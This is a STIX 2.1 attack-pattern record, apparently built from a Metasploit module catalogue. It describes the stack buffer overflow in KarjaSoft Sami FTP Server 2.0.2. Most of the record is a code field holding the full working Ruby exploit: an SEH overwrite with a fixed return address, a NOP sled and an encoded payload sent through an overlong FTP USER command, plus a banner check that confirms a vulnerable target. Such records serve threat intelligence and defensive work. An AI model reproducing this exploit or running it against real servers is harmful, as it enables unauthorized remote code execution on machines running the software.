{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--48563d63-a056-4326-9e7c-05638736bdba",
    "created": "2024-08-14T16:50:48.178578Z",
    "modified": "2024-08-14T16:50:48.178581Z",
    "name": "KarjaSoft Sami FTP Server v2.0.2 USER Overflow",
    "description": " This module exploits an unauthenticated stack buffer overflow in KarjaSoft Sami FTP Server version 2.0.2 by sending an overly long USER string during login.  The payload is triggered when the administrator opens the application GUI. If the GUI window is open at the time of exploitation, the payload will be executed immediately. Keep this in mind when selecting payloads. The application will crash following execution of the payload and will not restart automatically.  When the application is restarted, it will re-execute the payload unless the payload has been manually removed from the SamiFTP.binlog log file.  This module has been tested successfully on Sami FTP Server versions: 2.0.2 on Windows XP SP0 (x86); 2.0.2 on Windows 7 SP1 (x86); 2.0.2 on Windows 7 SP1 (x64); and 2.0.2 on Windows 10 (1909) (x64). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/sami_ftpd_user.rb",
            "external_id": "sami_ftpd_user.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-0441"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-2212"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'\t=> 'KarjaSoft Sami FTP Server v2.0.2 USER Overflow',\n        'Description'\t=> %q{\n          This module exploits an unauthenticated stack buffer overflow in\n          KarjaSoft Sami FTP Server version 2.0.2 by sending an overly long\n          USER string during login.\n\n          The payload is triggered when the administrator opens the application\n          GUI. If the GUI window is open at the time of exploitation, the\n          payload will be executed immediately. Keep this in mind when selecting\n          payloads. The application will crash following execution of the\n          payload and will not restart automatically.\n\n          When the application is restarted, it will re-execute the payload\n          unless the payload has been manually removed from the SamiFTP.binlog\n          log file.\n\n          This module has been tested successfully on Sami FTP Server versions:\n          2.0.2 on Windows XP SP0 (x86);\n          2.0.2 on Windows 7 SP1 (x86);\n          2.0.2 on Windows 7 SP1 (x64); and\n          2.0.2 on Windows 10 (1909) (x64).\n        },\n        'Author'\t=> [\n          'Muhammad Ahmed Siddiqui', # Discovery\n          'Critical Security', # Perl exploit\n          'n30m1nd', # Python exploit - SEH overwrite with 2.0.2 universal tmp01.dll p/p/r\n          'aushack', # Metasploit\n          'bcoles' # Metasploit\n        ],\n        'Arch'\t=> [ ARCH_X86 ],\n        'License'\t=> MSF_LICENSE,\n        'References'\t=>\n          [\n            # This vulnerability appears to have been reported multiple times.\n            ['CVE', '2006-0441'],\n            ['CVE', '2006-2212'],\n            ['OSVDB', '25670'],\n            ['BID', '16370'],\n            ['BID', '22045'],\n            ['BID', '17835'],\n            ['EDB', '1448'],\n            ['EDB', '1452'],\n            ['EDB', '1462'],\n            ['EDB', '3127'],\n            ['EDB', '3140'],\n            ['EDB', '40675']\n          ],\n        'DefaultOptions' =>\n          {\n            'EXITFUNC' => 'seh'\n          },\n        'Platform' => ['win'],\n        'Privileged' => false,\n        'Payload'\t=>\n          {\n            'Space'\t=> 800,\n            'BadChars' => \"\\x00\\x0a\\x0d\\x20\\xff\",\n            'EncoderType' => Msf::Encoder::Type::AlphanumMixed\n          },\n        'Targets' =>\n          [\n            ['Sami FTP Server version 2.0.2', { 'Ret' => 0x10022ADE }], # p/p/r tmp01.dll\n          ],\n        'Notes' => {\n          'Stability' => [ CRASH_SERVICE_DOWN ]\n        },\n        'DisclosureDate' => '2006-01-24'\n      )\n    )\n\n    register_options([\n      Opt::RPORT(21)\n    ])\n  end\n\n  def check\n    connect\n    banner = sock.get_once(-1, 3)\n    disconnect\n\n    unless banner.include?('Sami FTP Server')\n      return CheckCode::Safe('Target is not Sami FTP Server')\n    end\n\n    if banner.include?('Sami FTP Server 2.0.2')\n      return CheckCode::Appears('Sami FTP Server version 2.0.2.')\n    end\n\n    CheckCode::Detected\n  end\n\n  def exploit\n    connect\n\n    nseh = \"\\xeb\\x06\"\n    nseh << rand_text_alpha(2)\n    seh = [target.ret].pack('V')\n\n    user = rand_text_alpha(596)\n    user << nseh\n    user << seh\n    user << \"\\x90\" * 10\n    user << payload.encoded\n    user << \"\\x90\" * (800 - payload.encoded.length)\n\n    print_status(\"Sending payload (#{user.length} bytes) ...\")\n    sock.put(\"USER #{user}\\r\\n\")\n    sock.recv(4096)\n\n    sock.put(\"PASS #{Rex::Text.rand_char(payload_badchars)}\\r\\n\")\n    sock.recv(4096)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-01-24",
    "x_mitre_platforms": [
        "['win']"
    ]
}